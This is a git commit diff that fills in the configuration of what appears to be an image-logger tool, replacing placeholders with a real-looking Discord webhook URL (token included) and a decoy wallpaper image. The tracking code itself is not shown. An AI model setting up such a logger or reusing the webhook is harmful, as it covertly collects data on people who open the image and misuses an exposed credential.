98f2fc906375b66ac5ee06231af6afa7e80161b6
christian-combineV2OFFICIAL <piotrkafarski04@gmail.com>
2025-05-19 19:23:42 +0200

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1374074372754509915/hGMLoPRl2c2a-DzpsuwUKInH98KJEr2q9R7sFdrIfTlt9-EctvETane5aXvwXzsJM6iM",
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
